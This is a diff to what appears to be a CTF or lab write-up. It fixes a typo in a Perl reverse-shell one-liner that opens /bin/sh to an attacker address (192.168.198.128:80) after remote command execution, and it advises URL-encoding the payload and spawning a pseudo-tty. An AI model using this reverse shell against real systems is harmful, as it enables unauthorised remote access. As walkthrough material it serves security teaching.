@@ -355,7 +355,7 @@ if ($file == "/var/log/auth.log") {
 Awesome. Now that I can execute remote commands, it's reverse shell time. I always liked my reverse shell in Perl whenever it's available on the target system.
 
 ```perl
-perl -e 'use Socket;$i="192.168.198.128";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+perl -e 'use Socket;$i="192.168.198.128";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
 To avoid complications, it's best to `urlencode()` the above and then spawn a pseudo-tty for optimal output control.
